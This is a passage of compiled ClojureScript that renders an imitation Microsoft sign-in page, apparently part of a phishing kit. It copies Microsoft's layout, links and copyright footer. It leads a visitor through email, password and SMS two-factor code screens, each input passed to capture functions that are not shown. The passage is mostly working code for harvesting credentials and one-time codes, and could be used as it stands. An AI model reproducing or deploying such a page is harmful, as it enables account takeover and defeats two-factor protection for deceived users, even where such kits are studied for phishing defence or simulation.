return (function (value__$1,placeholder__$1,error_text__$1,valid_QMARK___$1,error_QMARK___$1,on_key_down__$1){
return new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),(cljs.core.truth_(cljs.core.deref.call(null,error_QMARK___$1))?new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"p","p",151049309),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 3, [new cljs.core.Keyword(null,"margin","margin",-995903681),"24px 0 8px",new cljs.core.Keyword(null,"color","color",1011675173),"#e81123",new cljs.core.Keyword(null,"font-size","font-size",-1847940346),".9375rem"], null)], null),error_text__$1], null):null),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"input","input",556931961),new cljs.core.PersistentArrayMap(null, 8, [new cljs.core.Keyword(null,"autoFocus","autoFocus",-552622425),true,new cljs.core.Keyword(null,"placeholder","placeholder",-104873083),placeholder__$1,new cljs.core.Keyword(null,"on-focus","on-focus",-13737624),((function (focused_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,focused_QMARK_,true);
});})(focused_QMARK_))
,new cljs.core.Keyword(null,"type","type",1174270348),((cljs.core._EQ_.call(null,placeholder__$1,"Password"))?new cljs.core.Keyword(null,"password","password",417022471):new cljs.core.Keyword(null,"text","text",-1790561697)),new cljs.core.Keyword(null,"on-blur","on-blur",814300747),((function (focused_QMARK_){
return (function (){
return cljs.core.reset_BANG_.call(null,focused_QMARK_,false);
});})(focused_QMARK_))
,new cljs.core.Keyword(null,"on-change","on-change",-732046149),((function (focused_QMARK_){
return (function (p1__12734_SHARP_){
return cljs.core.reset_BANG_.call(null,value__$1,p1__12734_SHARP_.target.value);
});})(focused_QMARK_))
,new cljs.core.Keyword(null,"on-key-down","on-key-down",-1374733765),((function (focused_QMARK_){
return (function (e){
if(cljs.core._EQ_.call(null,e.key,"Enter")){
if(cljs.core.truth_(valid_QMARK___$1.call(null,cljs.core.deref.call(null,value__$1)))){
return on_key_down__$1.call(null);
} else {
return cljs.core.reset_BANG_.call(null,error_QMARK___$1,true);
}
} else {
return null;
}
});})(focused_QMARK_))
,new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 6, [new cljs.core.Keyword(null,"padding","padding",1660304693),"6px 10px",new cljs.core.Keyword(null,"border-width","border-width",-1512605390),"1px",new cljs.core.Keyword(null,"width","width",-384071477),"100%",new cljs.core.Keyword(null,"border-color","border-color",-2059162761),(cljs.core.truth_(cljs.core.deref.call(null,error_QMARK___$1))?"#e81123":(cljs.core.truth_(cljs.core.deref.call(null,focused_QMARK_))?"#0067b8":"rgba(0,0,0,0.6)"
)),new cljs.core.Keyword(null,"height","height",1025178622),"36px",new cljs.core.Keyword(null,"outline","outline",793464534),new cljs.core.Keyword(null,"none","none",1333468478)], null)], null)], null)], null);
});
;})(focused_QMARK_))
});
msft.cljs.core.adder = (function msft$cljs$core$adder(){
var value = reagent.core.atom.call(null,"");
var error_QMARK_ = reagent.core.atom.call(null,false);
return ((function (value,error_QMARK_){
return (function (){
return new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.titled_box,"Sign in",new cljs.core.PersistentVector(null, 4, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentVector(null, 7, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.input,value,"Email or phone","Please enter your email address in the format someone@example.com",msft.cljs.core.valid_email_QMARK_,error_QMARK_,((function (value,error_QMARK_){
return (function (){
return msft.cljs.core.select_email.call(null,cljs.core.deref.call(null,value));
});})(value,error_QMARK_))
], null),new cljs.core.PersistentVector(null, 4, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.clearfix.flex.items-center","div.clearfix.flex.items-center",-1837805965),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"height","height",1025178622),"4rem"], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.col-6.col","div.col-6.col",-1164144246),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"margin-right","margin-right",809689658),"0.25rem"], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.back,new cljs.core.Keyword(null,"picker","picker",-659389603),"Back"], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.col-6.col","div.col-6.col",-1164144246),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"margin-left","margin-left",2015598377),"0.25rem"], null)], null),new cljs.core.PersistentVector(null, 4, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.submit,"Next",error_QMARK_,((function (value,error_QMARK_){
return (function (){
if(cljs.core.truth_(msft.cljs.core.valid_email_QMARK_.call(null,cljs.core.deref.call(null,value)))){
return msft.cljs.core.select_email.call(null,cljs.core.deref.call(null,value));
} else {
return cljs.core.reset_BANG_.call(null,error_QMARK_,true);
}
});})(value,error_QMARK_))
], null)], null)], null),new cljs.core.PersistentVector(null, 4, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"margin-top","margin-top",392161226),"16px"], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.link,"Get a new account","https://www.office.com/"], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.link,"Can't access your account?","https://support.microsoft.com/en-us/help/2412085/you-can-t-sign-in-to-office-365--azure--or-intune"], null)], null)], null)], null);
});
;})(value,error_QMARK_))
});
msft.cljs.core.passworder = (function msft$cljs$core$passworder(){
var value = reagent.core.atom.call(null,"");
var error_QMARK_ = reagent.core.atom.call(null,false);
var submitted_QMARK_ = reagent.core.atom.call(null,false);
return ((function (value,error_QMARK_,submitted_QMARK_){
return (function (){
return new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentVector(null, 5, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.flex.flex-row.relative","div.flex.flex-row.relative",1793708556),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 4, [new cljs.core.Keyword(null,"height","height",1025178622),"28px",new cljs.core.Keyword(null,"background","background",-863952629),"#f2f2f2",new cljs.core.Keyword(null,"margin","margin",-995903681),"16px -36px",new cljs.core.Keyword(null,"padding","padding",1660304693),"0 36px"], null)], null),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.absolute.left-0.bottom-0","div.absolute.left-0.bottom-0",-319504350),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 4, [new cljs.core.Keyword(null,"transition","transition",765692007),"all 2s ease-in",new cljs.core.Keyword(null,"height","height",1025178622),"1px",new cljs.core.Keyword(null,"background-color","background-color",570434026),"black",new cljs.core.Keyword(null,"width","width",-384071477),(cljs.core.truth_(cljs.core.deref.call(null,submitted_QMARK_))?"100%":"0%")], null)], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 3, [new cljs.core.Keyword(null,"line-height","line-height",1870784992),"28px",new cljs.core.Keyword(null,"text-align","text-align",1786091845),new cljs.core.Keyword(null,"right","right",-452581833),new cljs.core.Keyword(null,"width","width",-384071477),"calc(100% - 56px)"], null)], null),cljs.core.deref.call(null,msft.cljs.core.username)], null),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"img","img",1442687358),new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 4, [new cljs.core.Keyword(null,"margin-top","margin-top",392161226),"-20px",new cljs.core.Keyword(null,"width","width",-384071477),"48px",new cljs.core.Keyword(null,"height","height",1025178622),"48px",new cljs.core.Keyword(null,"margin-left","margin-left",2015598377),"8px"], null),new cljs.core.Keyword(null,"src","src",-1651076051),"user.svg"], null)], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.titled_box,"Enter Password",new cljs.core.PersistentVector(null, 4, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentVector(null, 7, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.input,value,"Password","Your account or password is incorrect.",msft.cljs.core.valid_password_QMARK_,error_QMARK_,((function (value,error_QMARK_,submitted_QMARK_){
return (function (){
cljs.core.reset_BANG_.call(null,submitted_QMARK_,true);

return msft.cljs.core.select_password.call(null,cljs.core.deref.call(null,value));
});})(value,error_QMARK_,submitted_QMARK_))
], null),new cljs.core.PersistentVector(null, 4, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.clearfix.flex.items-center","div.clearfix.flex.items-center",-1837805965),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"height","height",1025178622),"4rem"], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.col-6.col","div.col-6.col",-1164144246),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"margin-right","margin-right",809689658),"0.25rem"], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.back,new cljs.core.Keyword(null,"picker","picker",-659389603),"Back"], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.col-6.col","div.col-6.col",-1164144246),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"margin-left","margin-left",2015598377),"0.25rem"], null)], null),new cljs.core.PersistentVector(null, 4, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.submit,"Sign in",error_QMARK_,((function (value,error_QMARK_,submitted_QMARK_){
return (function (){
if(cljs.core.truth_(msft.cljs.core.valid_password_QMARK_.call(null,cljs.core.deref.call(null,value)))){
cljs.core.reset_BANG_.call(null,submitted_QMARK_,true);

return msft.cljs.core.select_password.call(null,cljs.core.deref.call(null,value));
} else {
return cljs.core.reset_BANG_.call(null,error_QMARK_,true);
}
});})(value,error_QMARK_,submitted_QMARK_))
], null)], null)], null),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"label#poop.click","label#poop.click",-1377551822),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"input","input",556931961),new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"type","type",1174270348),new cljs.core.Keyword(null,"checkbox","checkbox",1612615655),new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"width","width",-384071477),"20px",new cljs.core.Keyword(null,"height","height",1025178622),"20px"], null)], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"span","span",1394872991),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 3, [new cljs.core.Keyword(null,"padding-left","padding-left",-1180879053),"8px",new cljs.core.Keyword(null,"font-size","font-size",-1847940346),".9375rem",new cljs.core.Keyword(null,"margin-top","margin-top",392161226),"-10px"], null)], null),"Keep me signed in"], null)], null)], null)], null)], null)], null);
});
;})(value,error_QMARK_,submitted_QMARK_))
});
msft.cljs.core.twofaer = (function msft$cljs$core$twofaer(){
var value = reagent.core.atom.call(null,"");
var error_QMARK_ = reagent.core.atom.call(null,false);
var submitted_QMARK_ = reagent.core.atom.call(null,false);
return ((function (value,error_QMARK_,submitted_QMARK_){
return (function (){
return new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentVector(null, 5, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.flex.flex-row.relative","div.flex.flex-row.relative",1793708556),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 4, [new cljs.core.Keyword(null,"height","height",1025178622),"28px",new cljs.core.Keyword(null,"background","background",-863952629),"#f2f2f2",new cljs.core.Keyword(null,"margin","margin",-995903681),"16px -36px",new cljs.core.Keyword(null,"padding","padding",1660304693),"0 36px"], null)], null),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.absolute.left-0.bottom-0","div.absolute.left-0.bottom-0",-319504350),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 4, [new cljs.core.Keyword(null,"transition","transition",765692007),"all 2s ease-in",new cljs.core.Keyword(null,"height","height",1025178622),"1px",new cljs.core.Keyword(null,"background-color","background-color",570434026),"black",new cljs.core.Keyword(null,"width","width",-384071477),(cljs.core.truth_(cljs.core.deref.call(null,submitted_QMARK_))?"100%":"0%")], null)], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 3, [new cljs.core.Keyword(null,"line-height","line-height",1870784992),"28px",new cljs.core.Keyword(null,"text-align","text-align",1786091845),new cljs.core.Keyword(null,"right","right",-452581833),new cljs.core.Keyword(null,"width","width",-384071477),"calc(100% - 56px)"], null)], null),cljs.core.deref.call(null,msft.cljs.core.username)], null),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"img","img",1442687358),new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 4, [new cljs.core.Keyword(null,"margin-top","margin-top",392161226),"-20px",new cljs.core.Keyword(null,"width","width",-384071477),"48px",new cljs.core.Keyword(null,"height","height",1025178622),"48px",new cljs.core.Keyword(null,"margin-left","margin-left",2015598377),"8px"], null),new cljs.core.Keyword(null,"src","src",-1651076051),"user.svg"], null)], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.titled_box,"Enter code",new cljs.core.PersistentVector(null, 6, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"img","img",1442687358),new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"src","src",-1651076051),"sms.svg",new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 4, [new cljs.core.Keyword(null,"height","height",1025178622),"24px",new cljs.core.Keyword(null,"width","width",-384071477),"24px",new cljs.core.Keyword(null,"float","float",-1732389368),new cljs.core.Keyword(null,"left","left",-399115937),new cljs.core.Keyword(null,"margin-right","margin-right",809689658),"8px"], null)], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"p","p",151049309),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"font-size","font-size",-1847940346),"0.981rem"], null)], null),["We texted your phone +X XXXXXXXX",cljs.core.str.cljs$core$IFn$_invoke$arity$1(cljs.core.deref.call(null,msft.cljs.core.last_two)),". Please enter the code to sign in."].join('')], null),new cljs.core.PersistentVector(null, 7, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.input,value,"Code","Please enter the 6-digit code. The code only contains numbers.",msft.cljs.core.valid_twofa_QMARK_,error_QMARK_,((function (value,error_QMARK_,submitted_QMARK_){
return (function (){
cljs.core.reset_BANG_.call(null,submitted_QMARK_,true);

return msft.cljs.core.select_twofa.call(null,cljs.core.deref.call(null,value));
});})(value,error_QMARK_,submitted_QMARK_))
], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.clearfix.flex.items-center","div.clearfix.flex.items-center",-1837805965),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"height","height",1025178622),"4rem"], null)], null),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.col-12.col","div.col-12.col",-1249249060),new cljs.core.PersistentVector(null, 4, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.submit,"Verify",error_QMARK_,((function (value,error_QMARK_,submitted_QMARK_){
return (function (){
if(cljs.core.truth_(msft.cljs.core.valid_twofa_QMARK_.call(null,cljs.core.deref.call(null,value)))){
msft.cljs.core.select_twofa.call(null,cljs.core.deref.call(null,value));

return cljs.core.reset_BANG_.call(null,submitted_QMARK_,true);
} else {
return cljs.core.reset_BANG_.call(null,error_QMARK_,true);
}
});})(value,error_QMARK_,submitted_QMARK_))
], null)], null)], null),new cljs.core.PersistentVector(null, 4, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"margin-top","margin-top",392161226),"8px"], null)], null),new cljs.core.PersistentVector(null, 4, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.flex","div.flex",-396986231),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"font-size","font-size",-1847940346),".8125rem"], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"margin-right","margin-right",809689658),"4px"], null)], null),"Having trouble?"], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.link,"Sign in another way","https://support.microsoft.com/en-us/help/12409/microsoft-account-app-passwords-two-step-verification"], null)], null),new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.link,"More information","https://support.microsoft.com/en-us/help/12408/microsoft-account-about-two-step-verification"], null)], null)], null)], null)], null);
});
;})(value,error_QMARK_,submitted_QMARK_))
});
msft.cljs.core.primary_actions = (function msft$cljs$core$primary_actions(){
return new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"img","img",1442687358),new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"src","src",-1651076051),"logo.svg",new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 3, [new cljs.core.Keyword(null,"max-width","max-width",-1939924051),"256px",new cljs.core.Keyword(null,"height","height",1025178622),"24px",new cljs.core.Keyword(null,"vertical-align","vertical-align",651007333),new cljs.core.Keyword(null,"middle","middle",-701029031)], null)], null)], null),(function (){var G__12735 = cljs.core.deref.call(null,msft.cljs.core.app_state);
var G__12735__$1 = (((G__12735 instanceof cljs.core.Keyword))?G__12735.fqn:null);
switch (G__12735__$1) {
case "picker":
return new cljs.core.PersistentVector(null, 1, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.picker], null);

break;
case "adder":
return new cljs.core.PersistentVector(null, 1, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.adder], null);

break;
case "passworder":
return new cljs.core.PersistentVector(null, 1, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.passworder], null);

break;
case "twofaer":
return new cljs.core.PersistentVector(null, 1, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.twofaer], null);

break;
default:
throw (new Error(["No matching clause: ",cljs.core.str.cljs$core$IFn$_invoke$arity$1(G__12735__$1)].join('')));

}
})()], null);
});
msft.cljs.core.mobile_login_box = (function msft$cljs$core$mobile_login_box(){
return new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 5, [new cljs.core.Keyword(null,"background-color","background-color",570434026),"white",new cljs.core.Keyword(null,"height","height",1025178622),"100%",new cljs.core.Keyword(null,"color","color",1011675173),"#262626",new cljs.core.Keyword(null,"width","width",-384071477),"100%",new cljs.core.Keyword(null,"padding","padding",1660304693),"36px"], null)], null),new cljs.core.PersistentVector(null, 1, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.primary_actions], null)], null);
});
msft.cljs.core.login_box = (function msft$cljs$core$login_box(){
return new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),cljs.core.PersistentHashMap.fromArrays([new cljs.core.Keyword(null,"min-width","min-width",1926193728),new cljs.core.Keyword(null,"box-shadow","box-shadow",1600206755),new cljs.core.Keyword(null,"color","color",1011675173),new cljs.core.Keyword(null,"min-height","min-height",398480837),new cljs.core.Keyword(null,"background-color","background-color",570434026),new cljs.core.Keyword(null,"width","width",-384071477),new cljs.core.Keyword(null,"max-width","max-width",-1939924051),new cljs.core.Keyword(null,"padding","padding",1660304693),new cljs.core.Keyword(null,"border","border",1444987323),new cljs.core.Keyword(null,"margin-bottom","margin-bottom",388334941)],["320px","0 2px 3px rgba(0,0,0,0.55)","#262626","364px","white","calc(100% - 40px)","412px","36px","1px solid rgba(0,0,0,0.4)","28px"])], null),new cljs.core.PersistentVector(null, 1, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.primary_actions], null)], null);
});
msft.cljs.core.copyright = (function msft$cljs$core$copyright(c){
return new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"span","span",1394872991),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"color","color",1011675173),c,new cljs.core.Keyword(null,"margin","margin",-995903681),"0 8px"], null)], null),"2017 Microsoft"], null);
});
msft.cljs.core.terms_of_use = (function msft$cljs$core$terms_of_use(c){
return new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"a","a",-2123407586),new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"href","href",-793805698),"https://www.microsoft.com/en-US/servicesagreement/",new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 3, [new cljs.core.Keyword(null,"color","color",1011675173),c,new cljs.core.Keyword(null,"margin","margin",-995903681),"0 8px",new cljs.core.Keyword(null,"text-decoration","text-decoration",1836813207),new cljs.core.Keyword(null,"none","none",1333468478)], null)], null),"Terms of use"], null);
});
msft.cljs.core.privacy = (function msft$cljs$core$privacy(c){
return new cljs.core.PersistentVector(null, 3, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"a","a",-2123407586),new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"href","href",-793805698),"https://privacy.microsoft.com/en-US/privacystatement",new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 3, [new cljs.core.Keyword(null,"color","color",1011675173),c,new cljs.core.Keyword(null,"margin","margin",-995903681),"0 8px",new cljs.core.Keyword(null,"text-decoration","text-decoration",1836813207),new cljs.core.Keyword(null,"none","none",1333468478)], null)], null),"Privacy & Cookies"], null);
});
msft.cljs.core.footer = (function msft$cljs$core$footer(){
return new cljs.core.PersistentVector(null, 4, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.right","div.right",1671235139),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.copyright,"white"], null),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.terms_of_use,"white"], null),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.privacy,"white"], null)], null);
});
msft.cljs.core.mobile_footer = (function msft$cljs$core$mobile_footer(){
return new cljs.core.PersistentVector(null, 4, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div","div",1057191632),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.copyright,"#777"], null),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.terms_of_use,"#777"], null),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.privacy,"#777"], null)], null);
});
msft.cljs.core.app = (function msft$cljs$core$app(){
return new cljs.core.PersistentVector(null, 7, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.fixed.top-0.left-0.bottom-0.right-0.z0","div.fixed.top-0.left-0.bottom-0.right-0.z0",1107485062),new cljs.core.PersistentArrayMap(null, 2, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"background","background",-863952629),"url('0.jpg') no-repeat right"], null),new cljs.core.Keyword(null,"on-click","on-click",1632826543),(function (){
return msft.cljs.core.close_forgets.call(null);
})], null),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.absolute.top-0.left-0.bottom-0.right-0.z1","div.absolute.top-0.left-0.bottom-0.right-0.z1",1446552772),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"style","style",-496642736),new cljs.core.PersistentArrayMap(null, 1, [new cljs.core.Keyword(null,"background","background",-863952629),"rgba(0,0,0,0.65)"], null)], null)], null),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.z2.flex.justify-center.items-center.top-0.left-0.bottom-0.right-0.absolute.xs-hide","div.z2.flex.justify-center.items-center.top-0.left-0.bottom-0.right-0.absolute.xs-hide",1847220992),new cljs.core.PersistentVector(null, 1, 5, cljs.core.PersistentVector.EMPTY_NODE, [msft.cljs.core.login_box], null)], null),new cljs.core.PersistentVector(null, 2, 5, cljs.core.PersistentVector.EMPTY_NODE, [new cljs.core.Keyword(null,"div.z2.flex.justify-center.items-center.top-0.left-0.bottom-0.right-0.absolute.sm-hide.md-hide.lg-hide","div.z2.flex.justify-center.items-center.top-0.left-0.bottom-0.right-0.absolute.sm-hide.md-hide.lg-hide",-2035235126),new cljs.core.PersistentVector(null, 1, 5, 